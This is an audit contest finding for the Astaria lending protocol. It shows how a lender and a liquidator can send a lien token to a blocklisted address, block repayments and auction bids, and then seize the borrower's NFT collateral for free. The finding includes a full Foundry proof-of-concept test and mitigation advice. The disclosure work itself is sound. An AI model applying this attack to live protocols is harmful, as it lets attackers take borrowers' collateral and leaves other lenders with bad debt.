## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- upgraded by judge
- edited-by-warden
- H-01

# [`LienToken`: Lender and liquidator can collude to block auction and seize collateral](https://github.com/code-423n4/2023-01-astaria-findings/issues/607) 

# Lines of code

https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849
https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643


# Vulnerability details

If a lender offers a loan denominated in an ERC20 token that blocks transfers to certain addresses (for example, the USDT and USDC blocklist), they may collude with a liquidator (or act as the liquidator themselves) to prevent loan payments, block all bids in the liquidation auction, and seize the borrower's collateral by transferring a `LienToken` to a blocked address.

`LienTokens` act as bearer assets: if a lender transfers their lien token to another address, the lien's new payee will be the `ownerOf` the token:

[`LienToken#_getPayee`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L900-L909)

```solidity
  function _getPayee(LienStorage storage s, uint256 lienId)
    internal
    view
    returns (address)
  {
    return
      s.lienMeta[lienId].payee != address(0)
        ? s.lienMeta[lienId].payee
        : ownerOf(lienId);
  }
```

The payee address returned by `_getPayee` is used as the recipient address of loan repayments via `makePayment`:

[`LienToken#_payment`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849)

```solidity
    s.TRANSFER_PROXY.tokenTransferFrom(stack.lien.token, payer, payee, amount);
```

...as well as post-liquidation payments from the clearinghouse via `payDebtViaClearingHouse`:

[`LienToken#_paymentAH`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643)

```solidity
    if (payment > 0)
      s.TRANSFER_PROXY.tokenTransferFrom(token, payer, payee, payment);
```

If an adversary tranfers their `LienToken` to an address that causes these attempted transfers to revert, like an address on the USDC blocklist, the borrower will be unable to make payments on their lien, the loan will eventually qualify for liquidation, and all bids in the Seaport auction will revert when they attempt to send payment to the blocklisted address.

Following the failed auction, the liquidator can call `CollateralToken#liquidatorNFTClaim`, which calls `ClearingHouse#settleLiquidatorNFTClaim` and settles the loan for zero payment, claiming the "liquidated" collateral token for free:

[`ClearingHouse#settleLiquidatorNFTClaim`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231)

```solidity
  function settleLiquidatorNFTClaim() external {
    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));

    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));
    ClearingHouseStorage storage s = _getStorage();
    ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(
      address(0),
      COLLATERAL_ID(),
      0,
      s.auctionStack.stack
    );
  }
```

The lender will lose the amount of their lien, but can seize the borrower's collateral, worth more than their individual lien. Malicious lenders may offer small loans with attractive terms to lure unsuspecting borrowers. Note also that the lender and liquidator can be one and the same—they don't need to be different parties to pull off this attack! A clever borrower could potentially perform this attack as well, by acting as borrower, lender, and liquidator, and buying out one of their own liens by using loaned funds. 

(The failed auction liquidation logic above strikes me as a little odd as well: consider whether the liquidator should instead be required to pay a minimum amount covering the bad debt in order to claim the collateral token, rather than claiming it for free).

## Impact
- Malicious lender/liquidator loses amount of their lien, but keeps collateral NFT.
- Additional liens in the stack cannot be repaid. These other lenders take on bad debt and lose the amount of their liens.
- Borrower loses their collateral NFT, keeps full amount of their liens.

## Recommendation

This may be difficult to mitigate. Transferring a lien to a blocklisted address is one mechanism for this attack using USDT and USDC, but there are other ways arbitrary ERC20s might revert. Two potential options:

- Maintain an allowlist of supported ERC20s and limit it to well behaved tokens—WETH, DAI, etc.
- Do not "push" payments to payees on loan payment or auction settlement, but handle this in two steps—first receiving payment from the borrower or Seaport auction and storing it in escrow, then allowing lien owners to "pull" the escrowed payment.

## Test case

This test case needs some additional setup: a `CensorableMockERC20` simulating a blocklist, and a few test helpers modified to handle arbitrary ERC20s instead of WETH:

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity =0.8.17;

import "forge-std/Test.sol";
import "./TestHelpers.t.sol";

import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {OrderParameters} from "seaport/lib/ConsiderationStructs.sol";

contract CensorableMockERC20 is MockERC20 {
  address public forbidden;

  constructor(address _forbidden) MockERC20("Censorable ERC20", "CERC20", 18) {
    forbidden = _forbidden;
  }

  function transfer(address to, uint256 amount) public override returns (bool) {
    if (to == forbidden) revert("Transfer censored.");
    return super.transfer(to, amount);
  }

  function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    if (to == forbidden) revert("Transfer censored.");
    return super.transferFrom(from, to, amount);
  }

}

contract AstariaTest is TestHelpers {

  function _createPrivateERC20Vault(address strategist, address delegate, address token)
    internal
    returns (address privateVault)
  {
    vm.startPrank(strategist);
    privateVault = ASTARIA_ROUTER.newVault(delegate, token);
    vm.stopPrank();
  }

  function _lendToPrivateERC20Vault(Lender memory lender, address vault, address token) internal {
    vm.deal(lender.addr, lender.amountToLend);
    vm.startPrank(lender.addr);
    IERC20(token).approve(vault, lender.amountToLend);
    //min slippage on the deposit
    Vault(vault).deposit(lender.amountToLend, lender.addr);

    vm.stopPrank();
  }

  function _payERC20(
    ILienToken.Stack[] memory stack,
    uint8 position,
    uint256 amount,
    address payer,
    address token
  ) external returns (ILienToken.Stack[] memory newStack) {
    MockERC20(token).mint(payer, amount);
    vm.startPrank(payer);
    IERC20(token).approve(address(TRANSFER_PROXY), amount);
    IERC20(token).approve(address(LIEN_TOKEN), amount);
    newStack = LIEN_TOKEN.makePayment(
      stack[0].lien.collateralId,
      stack,
      position,
      amount
    );
    vm.stopPrank();
  }

  function _bidERC20(
    Bidder memory incomingBidder,
    OrderParameters memory params,
    uint256 bidAmount,
    address token
  ) external {
    MockERC20(token).mint(incomingBidder.bidder, bidAmount * 3);
    vm.startPrank(incomingBidder.bidder);

    if (bidderConduits[incomingBidder.bidder].conduitKey == bytes32(0)) {
      (, , address conduitController) = SEAPORT.information();
      bidderConduits[incomingBidder.bidder].conduitKey = Bytes32AddressLib
        .fillLast12Bytes(address(incomingBidder.bidder));

      bidderConduits[incomingBidder.bidder]
        .conduit = ConduitControllerInterface(conduitController).createConduit(
        bidderConduits[incomingBidder.bidder].conduitKey,
        address(incomingBidder.bidder)
      );

      ConduitControllerInterface(conduitController).updateChannel(
        address(bidderConduits[incomingBidder.bidder].conduit),
        address(SEAPORT),
        true
      );
      vm.label(
        address(bidderConduits[incomingBidder.bidder].conduit),
        "bidder conduit"
      );
    }
    IERC20(token).approve(bidderConduits[incomingBidder.bidder].conduit, bidAmount * 2);

    OrderParameters memory mirror = _createMirrorOrderParameters(
      params,
      payable(incomingBidder.bidder),
      params.zone,
      bidderConduits[incomingBidder.bidder].conduitKey
    );
    emit log_order(mirror);

    Order[] memory orders = new Order[](2);
    orders[0] = Order(params, new bytes(0));

    OrderComponents memory matchOrderComponents = getOrderComponents(
      mirror,
      consideration.getCounter(incomingBidder.bidder)
    );

    emit log_order(mirror);

    bytes memory mirrorSignature = signOrder(
      SEAPORT,
      incomingBidder.bidderPK,
      consideration.getOrderHash(matchOrderComponents)
    );
    orders[1] = Order(mirror, mirrorSignature);

    //order 0 - 1 offer 3 consideration

    // order 1 - 3 offer 1 consideration

    //offers    fulfillments
    // 0,0      1,0
    // 1,0      0,0
    // 1,1      0,1
    // 1,2      0,2

    // offer 0,0
    delete fulfillmentComponents;
    fulfillmentComponent = FulfillmentComponent(0, 0);
    fulfillmentComponents.push(fulfillmentComponent);

    //for each fulfillment we need to match them up
    firstFulfillment.offerComponents = fulfillmentComponents;
    delete fulfillmentComponents;
    fulfillmentComponent = FulfillmentComponent(1, 0);
    fulfillmentComponents.push(fulfillmentComponent);
    firstFulfillment.considerationComponents = fulfillmentComponents;
    fulfillments.push(firstFulfillment); // 0,0

    // offer 1,0
    delete fulfillmentComponents;
    fulfillmentComponent = FulfillmentComponent(1, 0);
    fulfillmentComponents.push(fulfillmentComponent);
    secondFulfillment.offerComponents = fulfillmentComponents;

    delete fulfillmentComponents;
    fulfillmentComponent = FulfillmentComponent(0, 0);
    fulfillmentComponents.push(fulfillmentComponent);
    secondFulfillment.considerationComponents = fulfillmentComponents;
    fulfillments.push(secondFulfillment); // 1,0

    // offer 1,1
    delete fulfillmentComponents;
    fulfillmentComponent = FulfillmentComponent(1, 1);
    fulfillmentComponents.push(fulfillmentComponent);
    thirdFulfillment.offerComponents = fulfillmentComponents;

    delete fulfillmentComponents;
    fulfillmentComponent = FulfillmentComponent(0, 1);
    fulfillmentComponents.push(fulfillmentComponent);

    //for each fulfillment we need to match them up
    thirdFulfillment.considerationComponents = fulfillmentComponents;
    fulfillments.push(thirdFulfillment); // 1,1

    //offer 1,2
    delete fulfillmentComponents;

    //royalty stuff, setup
    fulfillmentComponent = FulfillmentComponent(1, 2);
    fulfillmentComponents.push(fulfillmentComponent);
    fourthFulfillment.offerComponents = fulfillmentComponents;
    delete fulfillmentComponents;
    fulfillmentComponent = FulfillmentComponent(0, 2);
    fulfillmentComponents.push(fulfillmentComponent);
    fourthFulfillment.considerationComponents = fulfillmentComponents;

    if (params.consideration.length == uint8(3)) {
      fulfillments.push(fourthFulfillment); // 1,2
    }

    delete fulfillmentComponents;

    uint256 currentPrice = _locateCurrentAmount(
      params.consideration[0].startAmount,
      params.consideration[0].endAmount,
      params.startTime,
      params.endTime,
      false
    );
    if (bidAmount < currentPrice) {
      uint256 warp = _computeWarp(
        currentPrice,
        bidAmount,
        params.startTime,
        params.endTime
      );
      emit log_named_uint("start", params.consideration[0].startAmount);
      emit log_named_uint("amount", bidAmount);
      emit log_named_uint("warping", warp);
      skip(warp + 1000);
      uint256 currentAmount = _locateCurrentAmount(
        orders[0].parameters.consideration[0].startAmount,
        orders[0].parameters.consideration[0].endAmount,
        orders[0].parameters.startTime,
        orders[0].parameters.endTime,
        false
      );
      emit log_named_uint("currentAmount asset", currentAmount);
      uint256 currentAmountFee = _locateCurrentAmount(
        orders[0].parameters.consideration[1].startAmount,
        orders[0].parameters.consideration[1].endAmount,
        orders[0].parameters.startTime,
        orders[0].parameters.endTime,
        false
      );
      emit log_named_uint("currentAmount fee", currentAmountFee);
      emit log_fills(fulfillments);
      emit log_named_uint("length", fulfillments.length);

      consideration.matchOrders(orders, fulfillments);
    } else {
      consideration.fulfillAdvancedOrder(
        AdvancedOrder(orders[0].parameters, 1, 1, orders[0].signature, ""),
        new CriteriaResolver[](0),
        bidderConduits[incomingBidder.bidder].conduitKey,
        address(0)
      );
    }
    delete fulfillments;
    vm.stopPrank();
  }

  function testLiquidationBlockedERC20Transfer() public {
    address forbidden = makeAddr("forbidden");
    CensorableMockERC20 loanToken = new CensorableMockERC20(forbidden);
    loanToken.mint(strategistOne, 50 ether);

    address borrower = address(69);
    address liquidator = address(7);
    TestNFT nft = new TestNFT(0);
    _mintNoDepositApproveRouterSpecific(borrower, address(nft), 99);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(99);

    address privateVault = _createPrivateERC20Vault({
      strategist: strategistOne,
      delegate: strategistTwo,
      token: address(loanToken)
    });

    _lendToPrivateERC20Vault(
      Lender({addr: strategistOne, amountToLend: 50 ether}),
      privateVault,
      address(loanToken)
    );

    ILienToken.Details memory lien = standardLienDetails;
    lien.duration = 14 days;

    vm.startPrank(borrower);
    (, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 50 ether,
      isFirstLien: true
    });
    vm.stopPrank();

    {
    uint256 lienTokenId = stack[0].point.lienId;
    address lienOwner = ILienToken(LIEN_TOKEN).ownerOf(lienTokenId);
    assertEq(lienOwner, strategistOne);

    vm.prank(strategistOne);
    LIEN_TOKEN.transferFrom(strategistOne, forbidden, lienTokenId);
    }

    // Borrower cannot make payments
    vm.expectRevert("TRANSFER_FROM_FAILED");
    this._payERC20(stack, 0, 1 ether, borrower, address(loanToken));
    vm.stopPrank();

    vm.warp(block.timestamp + lien.duration);

    vm.startPrank(liquidator);
    OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(
      stack,
      uint8(0)
    );
    vm.stopPrank();
    uint256 bid = 100 ether;

    vm.expectRevert("TRANSFER_FROM_FAILED");
    this._bidERC20(Bidder(bidder, bidderPK), listedOrder, bid, address(loanToken));
    vm.stopPrank();

    // Clearing house still owns NFT
    assertEq(nft.ownerOf(tokenId), address(COLLATERAL_TOKEN.getClearingHouse(stack[0].lien.collateralId)));

    // Liquidator can claim collateral for free
    skip(4 days);
    vm.prank(liquidator);
    COLLATERAL_TOKEN.liquidatorNFTClaim(listedOrder);
    assertEq(
      nft.ownerOf(tokenId),
      liquidator
    );

    // Borrower still has 50 tokens from lender
    assertEq(loanToken.balanceOf(borrower), 50 ether);
  }
}
```
